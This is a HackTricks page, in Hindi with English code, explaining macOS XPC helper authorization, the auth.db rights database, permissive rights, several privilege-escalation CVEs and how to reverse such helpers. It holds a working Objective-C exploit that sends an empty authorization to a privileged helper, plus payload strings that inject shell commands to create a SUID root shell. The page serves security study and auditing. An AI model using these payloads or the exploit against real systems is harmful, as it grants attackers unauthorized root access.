# macOS XPC Authorization

{{#include ../../../../../banners/hacktricks-training.md}}

## XPC Authorization

Apple यह प्रमाणित करने का एक अन्य तरीका भी प्रस्तावित करता है कि connecting process के पास **exposed XPC method को call करने की permissions हैं** या नहीं।

जब किसी application को **privileged user के रूप में actions execute करने की आवश्यकता होती है**, तो app को privileged user के रूप में चलाने के बजाय यह आमतौर पर एक HelperTool को root के रूप में XPC service के तौर पर install करती है, जिसे app उन actions को perform करने के लिए call कर सकती है। हालांकि, service को call करने वाली app के पास पर्याप्त authorization होनी चाहिए।

### ShouldAcceptNewConnection हमेशा YES

इसका एक उदाहरण [EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample) में मिल सकता है। `App/AppDelegate.m` में यह **HelperTool से connect** करने का प्रयास करता है। और `HelperTool/HelperTool.m` में **`shouldAcceptNewConnection` function** पहले बताए गए किसी भी requirement को **check नहीं करेगा**। यह हमेशा YES return करेगा:<sup>[1]</sup>
```objectivec
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
// Called by our XPC listener when a new connection comes in.  We configure the connection
// with our protocol and ourselves as the main object.
{
assert(listener == self.listener);
#pragma unused(listener)
assert(newConnection != nil);

newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
newConnection.exportedObject = self;
[newConnection resume];

return YES;
}
```
अधिक जानकारी के लिए कि इस check को सही तरीके से कैसे configure करें:


{{#ref}}
macos-xpc-connecting-process-check/
{{#endref}}

### Application rights

हालाँकि, **HelperTool की किसी method को call किए जाने पर authorization हो रहा है**।

`App/AppDelegate.m` से **`applicationDidFinishLaunching`** function app शुरू होने के बाद एक empty authorization reference बनाएगा। यह हमेशा काम करना चाहिए।\
इसके बाद, यह `setupAuthorizationRights` को call करके उस authorization reference में **कुछ rights जोड़ने** का प्रयास करेगा:
```objectivec
- (void)applicationDidFinishLaunching:(NSNotification *)note
{
[...]
err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
if (err == errAuthorizationSuccess) {
err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
}
if (err == errAuthorizationSuccess) {
self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
}
assert(err == errAuthorizationSuccess);

// If we successfully connected to Authorization Services, add definitions for our default
// rights (unless they're already in the database).

if (self->_authRef) {
[Common setupAuthorizationRights:self->_authRef];
}

[self.window makeKeyAndOrderFront:self];
}
```
`Common/Common.m` से `setupAuthorizationRights` function application के rights को auth database `/var/db/auth.db` में store करेगा। ध्यान दें कि यह केवल उन rights को add करेगा जो अभी तक database में मौजूद नहीं हैं:
```objectivec
+ (void)setupAuthorizationRights:(AuthorizationRef)authRef
// See comment in header.
{
assert(authRef != NULL);
[Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
OSStatus    blockErr;

// First get the right.  If we get back errAuthorizationDenied that means there's
// no current definition, so we add our default one.

blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
if (blockErr == errAuthorizationDenied) {
blockErr = AuthorizationRightSet(
authRef,                                    // authRef
[authRightName UTF8String],                 // rightName
(__bridge CFTypeRef) authRightDefault,      // rightDefinition
(__bridge CFStringRef) authRightDesc,       // descriptionKey
NULL,                                       // bundle (NULL implies main bundle)
CFSTR("Common")                             // localeTableName
);
assert(blockErr == errAuthorizationSuccess);
} else {
// A right already exists (err == noErr) or any other error occurs, we
// assume that it has been set up in advance by the system administrator or
// this is the second time we've run.  Either way, there's nothing more for
// us to do.
}
}];
}
```
`enumerateRightsUsingBlock` function का उपयोग applications की permissions प्राप्त करने के लिए किया जाता है, जिन्हें `commandInfo` में परिभाषित किया गया है:
```objectivec
static NSString * kCommandKeyAuthRightName    = @"authRightName";
static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";

+ (NSDictionary *)commandInfo
{
static dispatch_once_t sOnceToken;
static NSDictionary *  sCommandInfo;

dispatch_once(&sOnceToken, ^{
sCommandInfo = @{
NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to read its license key.",
@"prompt shown when user is required to authorize to read the license key"
)
},
NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to write its license key.",
@"prompt shown when user is required to authorize to write the license key"
)
},
NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to start its web service.",
@"prompt shown when user is required to authorize to start the web service"
)
}
};
});
return sCommandInfo;
}

+ (NSString *)authorizationRightForCommand:(SEL)command
// See comment in header.
{
return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
}

+ (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
// Calls the supplied block with information about each known authorization right..
{
[self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
#pragma unused(key)
#pragma unused(stop)
NSDictionary *  commandDict;
NSString *      authRightName;
id              authRightDefault;
NSString *      authRightDesc;

// If any of the following asserts fire it's likely that you've got a bug
// in sCommandInfo.

commandDict = (NSDictionary *) obj;
assert([commandDict isKindOfClass:[NSDictionary class]]);

authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
assert([authRightName isKindOfClass:[NSString class]]);

authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
assert(authRightDefault != nil);

authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
assert([authRightDesc isKindOfClass:[NSString class]]);

block(authRightName, authRightDefault, authRightDesc);
}];
}
```
इसका अर्थ है कि इस process के अंत में, `commandInfo` के अंदर घोषित permissions `/var/db/auth.db` में store की जाएंगी। ध्यान दें कि वहां आप **प्रत्येक method** के लिए, जिसे **authentication की आवश्यकता होगी**, **permission name** और **`kCommandKeyAuthRightDefault`** पा सकते हैं। बाद वाला **यह दर्शाता है कि यह right किसे मिल सकता है**।

किसे किसी right तक access मिल सकता है, यह दर्शाने के लिए अलग-अलग scopes होते हैं। इनमें से कुछ [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h) में defined हैं (आप [इन सभी को यहां](https://www.dssw.co.uk/reference/authorization-rights/) पा सकते हैं), लेकिन संक्षेप में:

<table><thead><tr><th width="284.3333333333333">Name</th><th width="165">Value</th><th>Description</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>कोई भी</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>कोई नहीं</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>Current user का admin होना आवश्यक है (admin group के अंदर)</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>User से authenticate करने के लिए कहें।</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>User से authenticate करने के लिए कहें। उसका admin होना आवश्यक है (admin group के अंदर)</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>Rules specify करें</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>Right पर कुछ अतिरिक्त comments specify करें</td></tr></tbody></table>

### Rights Verification

`HelperTool/HelperTool.m` में **`readLicenseKeyAuthorization`** function, **`checkAuthorization`** function को call करके यह check करता है कि caller को **ऐसी method execute करने की अनुमति है या नहीं**। यह function check करेगा कि calling process द्वारा भेजे गए **authData** का **format सही है या नहीं**, और फिर यह check करेगा कि specific method को call करने के लिए **right प्राप्त करने हेतु क्या आवश्यक है**। यदि सब कुछ सही रहता है, तो returned **`error` `nil` होगा**:
```objectivec
- (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
{
[...]

// First check that authData looks reasonable.

error = nil;
if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
}

// Create an authorization ref from that the external form data contained within.

if (error == nil) {
err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);

// Authorize the right associated with the command.

if (err == errAuthorizationSuccess) {
AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
AuthorizationRights rights   = { 1, &oneRight };

oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
assert(oneRight.name != NULL);

err = AuthorizationCopyRights(
authRef,
&rights,
NULL,
kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
NULL
);
}
if (err != errAuthorizationSuccess) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
}
}

if (authRef != NULL) {
junk = AuthorizationFree(authRef, 0);
assert(junk == errAuthorizationSuccess);
}

return error;
}
```
ध्यान दें कि उस method को call करने का **अधिकार प्राप्त करने की requirements को check करने** के लिए function `authorizationRightForCommand` पहले से comment किए गए object **`commandInfo`** को ही check करेगा। इसके बाद, यह **यह check करने के लिए कि उसके पास function को call करने के अधिकार हैं या नहीं**, **`AuthorizationCopyRights`** को call करेगा (ध्यान दें कि flags user के साथ interaction की अनुमति देते हैं)।

इस मामले में, function `readLicenseKeyAuthorization` को call करने के लिए `kCommandKeyAuthRightDefault` को `@kAuthorizationRuleClassAllow` पर define किया गया है। इसलिए **कोई भी इसे call कर सकता है**।

### DB Information

यह बताया गया था कि यह information `/var/db/auth.db` में stored है। आप सभी stored rules को इस प्रकार list कर सकते हैं:
```sql
sudo sqlite3 /var/db/auth.db
SELECT name FROM rules;
SELECT name FROM rules WHERE name LIKE '%safari%';
```
इसके बाद, आप पता कर सकते हैं कि इस right को कौन access कर सकता है:
```bash
security authorizationdb read com.apple.safaridriver.allow
```
### Permissive rights

आप **सभी permissions configurations** [**यहाँ देख सकते हैं**](https://www.dssw.co.uk/reference/authorization-rights/), लेकिन वे combinations जिनमें user interaction की आवश्यकता नहीं होगी:

1. **'authenticate-user': 'false'**
- यह सबसे direct key है। यदि इसे `false` पर set किया जाता है, तो इसका अर्थ है कि इस right को प्राप्त करने के लिए user को authentication प्रदान करने की आवश्यकता नहीं है।
- इसका उपयोग **नीचे दिए गए 2 विकल्पों में से किसी एक के साथ या उस group को निर्दिष्ट करने के लिए किया जाता है** जिसका user सदस्य होना चाहिए।
2. **'allow-root': 'true'**
- यदि कोई user root user के रूप में कार्य कर रहा है (जिसके पास elevated permissions होती हैं), और यह key `true` पर set है, तो root user संभावित रूप से अतिरिक्त authentication के बिना यह right प्राप्त कर सकता है। हालांकि, सामान्यतः root user status प्राप्त करने के लिए पहले से ही authentication आवश्यक होती है, इसलिए अधिकांश users के लिए यह "no authentication" scenario नहीं है।
3. **'session-owner': 'true'**
- यदि इसे `true` पर set किया जाता है, तो session का owner (वर्तमान में logged-in user) स्वतः यह right प्राप्त कर लेगा। यदि user पहले से logged in है, तो इससे additional authentication bypass हो सकती है।
4. **'shared': 'true'**
- यह key authentication के बिना rights प्रदान नहीं करती। इसके बजाय, यदि इसे `true` पर set किया जाता है, तो इसका अर्थ है कि एक बार right authenticate हो जाने के बाद, इसे multiple processes के बीच share किया जा सकता है और प्रत्येक process को दोबारा authenticate करने की आवश्यकता नहीं होगी। लेकिन right का initial granting अभी भी authentication की मांग करेगा, जब तक कि इसे `'authenticate-user': 'false'` जैसी अन्य keys के साथ combine न किया जाए।

आप interesting rights प्राप्त करने के लिए [**इस script का उपयोग कर सकते हैं**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9):
```bash
Rights with 'authenticate-user': 'false':
is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)

Rights with 'allow-root': 'true':
com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek, com-apple-openscripting-additions-send, com-apple-reportpanic-fixright, com-apple-servicemanagement-blesshelper, com-apple-xtype-fontmover-install, com-apple-xtype-fontmover-remove, com-apple-dt-instruments-process-analysis, com-apple-dt-instruments-process-kill, com-apple-pcastagentconfigd-wildcard, com-apple-trust-settings-admin, com-apple-wifivelocity, com-apple-wireless-diagnostics, is-root, system-install-iap-software, system-install-software, system-install-software-iap, system-preferences, system-preferences-accounts, system-preferences-datetime, system-preferences-energysaver, system-preferences-network, system-preferences-printing, system-preferences-security, system-preferences-sharing, system-preferences-softwareupdate, system-preferences-startupdisk, system-preferences-timemachine, system-print-operator, system-privilege-admin, system-services-networkextension-filtering, system-services-networkextension-vpn, system-services-systemconfiguration-network, system-sharepoints-wildcard

Rights with 'session-owner': 'true':
authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
```
### Authorization Bypass Case Studies

- **CVE-2025-65842 – Acustica Audio Aquarius HelperTool**: privileged Mach service `com.acustica.HelperTool` हर connection स्वीकार करती है और इसकी `checkAuthorization:` routine `AuthorizationCopyRights(NULL, …)` को call करती है, इसलिए कोई भी 32-byte blob pass हो जाता है। इसके बाद `executeCommand:authorization:withReply:` attacker-controlled comma-separated strings को `NSTask` में root के रूप में feed करता है, जिससे payloads जैसे:
```bash
"/bin/sh,-c,cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"
```
trivially एक SUID root shell बनाएँ। Details [इस write-up](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/) में हैं।<sup>[6]</sup>
- **CVE-2025-55076 – Plugin Alliance InstallationHelper**: listener हमेशा YES लौटाता है और वही NULL `AuthorizationCopyRights` pattern `checkAuthorization:` में भी दिखाई देता है। Method `exchangeAppWithReply:` attacker input को दो बार `system()` string में concatenate करता है, इसलिए `appPath` में shell metacharacters inject करने पर (जैसे `"/Applications/Test.app";chmod 4755 /tmp/rootbash;`) Mach service `com.plugin-alliance.pa-installationhelper` के माध्यम से root code execution प्राप्त होता है। अधिक जानकारी [यहाँ](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/) है।<sup>[7]</sup>
- **CVE-2024-4395 – Jamf Compliance Editor helper**: audit चलाने पर `/Library/LaunchDaemons/com.jamf.complianceeditor.helper.plist` drop होती है, Mach service `com.jamf.complianceeditor.helper` expose होती है, और `-executeScriptAt:arguments:then:` export होता है, लेकिन caller के `AuthorizationExternalForm` या code signature को verify नहीं किया जाता। एक trivial exploit एक empty reference को `AuthorizationCreate` करता है, `[[NSXPCConnection alloc] initWithMachServiceName:options:NSXPCConnectionPrivileged]` से connect करता है और method invoke करके root के रूप में arbitrary binaries execute करता है। Full reversing notes (साथ में PoC) [Mykola Grymalyuk’s write-up](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html) में हैं।<sup>[4]</sup>
- **CVE-2025-25251 – FortiClient Mac helper**: FortiClient Mac 7.0.0–7.0.14, 7.2.0–7.2.8 और 7.4.0–7.4.2 crafted XPC messages स्वीकार करते थे, जो authorization gates से रहित privileged helper तक पहुँचते थे। क्योंकि helper अपने स्वयं के privileged `AuthorizationRef` पर भरोसा करता था, service को message भेजने में सक्षम कोई भी local user उसे root के रूप में arbitrary configuration changes या commands execute करने के लिए बाध्य कर सकता था। Details [SentinelOne’s advisory summary](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/) में हैं।<sup>[5]</sup>

#### Rapid triage tips

- जब कोई app GUI और helper दोनों ship करता है, तो उनकी code requirements का diff करें और जाँचें कि क्या `shouldAcceptNewConnection` listener को `-setCodeSigningRequirement:` से lock करता है (या `SecCodeCopySigningInformation` को validate करता है)। Missing checks आमतौर पर Jamf case जैसे CWE-863 scenarios उत्पन्न करते हैं। एक quick peek इस प्रकार दिखता है:
```bash
codesign --display --requirements - /Applications/Jamf\ Compliance\ Editor.app
```
- Helper जिस चीज़ को authorize करने के बारे में *सोचता* है, उसकी तुलना client द्वारा दी गई जानकारी से करें। Reversing करते समय `AuthorizationCopyRights` पर break करें और पुष्टि करें कि `AuthorizationRef`, helper के अपने privileged context के बजाय `AuthorizationCreateFromExternalForm` (client provided) से originate होता है; अन्यथा संभवतः आपको ऊपर दिए गए मामलों जैसा CWE-863 pattern मिला है।

## Reversing Authorization

### Checking if EvenBetterAuthorization is used

यदि आपको function: **`[HelperTool checkAuthorization:command:]`** मिलता है, तो संभवतः process authorization के लिए पहले बताए गए schema का उपयोग कर रहा है:

<figure><img src="../../../../../images/image (42).png" alt=""><figcaption></figcaption></figure>

यदि यह function `AuthorizationCreateFromExternalForm`, `authorizationRightForCommand`, `AuthorizationCopyRights`, `AuhtorizationFree` जैसे functions को call कर रहा है, तो यह [**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154) का उपयोग कर रहा है।

यह देखने के लिए **`/var/db/auth.db`** check करें कि क्या user interaction के बिना किसी privileged action को call करने की permissions प्राप्त करना संभव है।

### Protocol Communication

इसके बाद, XPC service के साथ communication स्थापित करने में सक्षम होने के लिए आपको protocol schema ढूँढना होगा।

Function **`shouldAcceptNewConnection`** export किए जा रहे protocol को दर्शाता है:

<figure><img src="../../../../../images/image (44).png" alt=""><figcaption></figcaption></figure>

इस मामले में, हमारे पास EvenBetterAuthorizationSample जैसा ही है, [**check this line**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94)।

उपयोग किए गए protocol का नाम ज्ञात होने पर, इसे निम्नलिखित command से **dump its header definition** करना संभव है:
```bash
class-dump /Library/PrivilegedHelperTools/com.example.HelperTool

[...]
@protocol HelperToolProtocol
- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
@end
[...]
```
अंततः, हमें केवल **exposed Mach Service का name** जानना होगा, ताकि हम उसके साथ communication स्थापित कर सकें। इसे खोजने के कई तरीके हैं:

- **`[HelperTool init]`** में, जहाँ आप उपयोग किए जा रहे Mach Service को देख सकते हैं:

<figure><img src="../../../../../images/image (41).png" alt=""><figcaption></figcaption></figure>

- launchd plist में:
```xml
cat /Library/LaunchDaemons/com.example.HelperTool.plist

[...]

<key>MachServices</key>
<dict>
<key>com.example.HelperTool</key>
<true/>
</dict>
[...]
```
### Exploit Example

इस उदाहरण में निम्नलिखित बनाया गया है:

- functions के साथ protocol की definition
- access मांगने के लिए उपयोग किया जाने वाला एक empty auth
- XPC service से connection
- connection सफल होने पर function को call करना
```objectivec
// gcc -framework Foundation -framework Security expl.m -o expl

#import <Foundation/Foundation.h>
#import <Security/Security.h>

// Define a unique service name for the XPC helper
static NSString* XPCServiceName = @"com.example.XPCHelper";

// Define the protocol for the helper tool
@protocol XPCHelperProtocol
- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
@end

int main(void) {
NSData *authData;
OSStatus status;
AuthorizationExternalForm authForm;
AuthorizationRef authReference = {0};
NSString *proxyAddress = @"127.0.0.1";
NSString *proxyPort = @"4444";
Boolean isProxyEnabled = true;

// Create an empty authorization reference
status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);

// Convert the authorization reference to an external form
if (status == errAuthorizationSuccess) {
status = AuthorizationMakeExternalForm(authReference, &authForm);
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Convert the external form to NSData for transmission
if (status == errAuthorizationSuccess) {
authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Ensure the authorization was successful
assert(status == errAuthorizationSuccess);

// Establish an XPC connection
NSString *serviceName = XPCServiceName;
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
[xpcConnection setRemoteObjectInterface:xpcInterface];
[xpcConnection resume];

// Handle errors for the XPC connection
id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
NSLog(@"[-] Connection error");
NSLog(@"[-] Error: %@", error);
}];

// Log the remote proxy and connection objects
NSLog(@"Remote Proxy: %@", remoteProxy);
NSLog(@"XPC Connection: %@", xpcConnection);

// Use the legacy method to configure the proxy
[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
NSLog(@"Response: %@", error);
}];

// Allow some time for the operation to complete
[NSThread sleepForTimeInterval:10.0f];

NSLog(@"Finished!");
}
```
## दुरुपयोग किए गए अन्य XPC privilege helpers

- [https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)<sup>[8]</sup>

## References

- [1] [Apple Developer — EvenBetterAuthorizationSample](https://developer.apple.com/library/archive/samplecode/EvenBetterAuthorizationSample/Introduction/Intro.html) ([GitHub पर mirror](https://github.com/brenwell/EvenBetterAuthorizationSample))
- [2] [Apple Developer — Authorization Services](https://developer.apple.com/documentation/security/authorization-services)
- [3] [Apple Developer — `AuthorizationCopyRights`](https://developer.apple.com/documentation/security/authorizationcopyrights(_:_:_:_:_:))
- [4] [CVE-2024-4395: Jamf Compliance Editor में Privilege Escalation](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html)
- [5] [CVE-2025-25251: FortiClient Mac में Privilege Escalation flaw](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/)
- [6] [CVE-2025-65842 – macOS पर Aquarius Desktop में Acustica Audio HelperTool XPC Service Local Privilege Escalation](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/)
- [7] [CVE-2025-55076 – Plugin Alliance InstallationHelper XPC Service Local Privilege Escalation](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/)
- [8] [CVE-2019-8805: Apple EndpointSecurity framework Privilege Escalation (SecureLayer7)](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)

{{#include ../../../../../banners/hacktricks-training.md}}
